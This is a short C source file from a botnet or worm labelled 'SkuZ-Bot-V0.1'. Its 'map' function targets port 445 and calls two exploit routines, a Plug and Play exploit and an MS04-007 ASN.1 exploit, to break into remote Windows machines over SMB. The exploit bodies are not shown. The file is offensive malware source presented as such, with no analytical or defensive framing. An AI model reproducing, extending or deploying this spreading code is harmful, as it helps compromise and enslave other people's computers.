/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_MS04007ASN1
#ifndef NO_MAP
#ifndef NO_PNP


BOOL map(EXINFO exinfo)
 {
	exinfo.port = 445;
	BOOL bPNP = pnp(exinfo);
	exinfo.port = 445;
	BOOL bASN1SMB = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	return bASN1SMB || bPNP  ? TRUE : FALSE;
}

#endif
#endif
#endif
/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 